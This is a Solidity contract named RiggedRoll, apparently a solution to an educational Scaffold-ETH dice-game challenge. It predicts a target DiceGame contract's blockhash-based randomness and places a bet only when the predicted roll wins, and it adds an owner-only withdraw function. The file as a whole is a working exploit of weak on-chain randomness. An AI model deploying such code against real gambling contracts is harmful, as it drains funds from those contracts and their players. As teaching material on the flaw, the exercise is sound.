pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;
    uint256 public nonce = 0;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(
            _amount <= address(this).balance && _amount > 0,
            "Inappropriate amount"
        );
        (bool status, ) = _addr.call{value: _amount}("");
        require(status, "Withdraw failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "insufficient balance");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(this), nonce)
        );
        uint256 roll = uint256(hash) % 16;
        console.log("Rigged roll is: ", roll);
        if (roll == 1 || roll == 2 || roll == 0) {
            diceGame.rollTheDice{value: .002 ether}();
        }
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
